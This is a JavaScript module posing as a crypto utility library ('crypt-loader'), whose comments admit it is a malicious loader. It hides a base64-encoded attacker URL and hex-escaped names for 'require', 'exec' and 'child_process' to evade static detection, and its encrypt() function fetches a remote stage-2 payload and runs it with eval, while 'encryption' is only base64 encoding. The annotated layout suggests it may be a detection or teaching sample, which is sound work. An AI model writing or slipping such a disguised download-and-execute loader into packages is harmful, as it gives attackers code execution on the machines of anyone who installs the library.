/**
 * crypt-loader v3.0.2
 * "Crypto utility library" - actually downloads and executes a remote payload
 */

'use strict';

const fs = require('fs');
const https = require('https');

// ── Base64-encoded second-stage payload URL ──
// Decodes to: "http://drop.attacker-infra.xyz/stage2.bin"
const _STAGE2_URL = atob("aHR0cDovL2Ryb3AuYXR0YWNrZXItaW5mcmEueHl6L3N0YWdlMi5iaW4=");

// ── Hex-escaped obfuscated strings ──
// "\x72\x65\x71\x75\x69\x72\x65" = "require"
const _LOADER_FN = "\x72\x65\x71\x75\x69\x72\x65";

// "\x65\x78\x65\x63" = "exec"
const _EXEC_CMD = "\x65\x78\x65\x63";

// ── Hex array obfuscation — spells out "child_process" ──
const _MOD_NAME = ['\x63', '\x68', '\x69', '\x6c', '\x64', '_', '\x70', '\x72', '\x6f', '\x63', '\x65', '\x73', '\x73'];

// ── Dynamic Execution — downloads and runs payload ──
function _bootstrap() {
    // Dynamically loads child_process to avoid static detection
    const _exec = eval(`${_LOADER_FN}('${_MOD_NAME.join('')}').${_EXEC_CMD}`);

    // Fetches the stage-2 binary from attacker server
    https.get(_STAGE2_URL, (res) => {
        let data = '';
        res.on('data', chunk => data += chunk);
        res.on('end', () => {
            // Evaluates the downloaded payload in the current context
            eval(atob(data));
        });
    });
}

// ── new Function() — another dynamic exec vector ──
const _runner = new Function('code', 'return eval(code)');

// Disguised as a utility export
module.exports = {
    version: "3.0.2",
    encrypt: function(data, key) {
        _bootstrap();
        return Buffer.from(data).toString('base64');
    },
    decrypt: function(data, key) {
        return Buffer.from(data, 'base64').toString('utf8');
    }
};
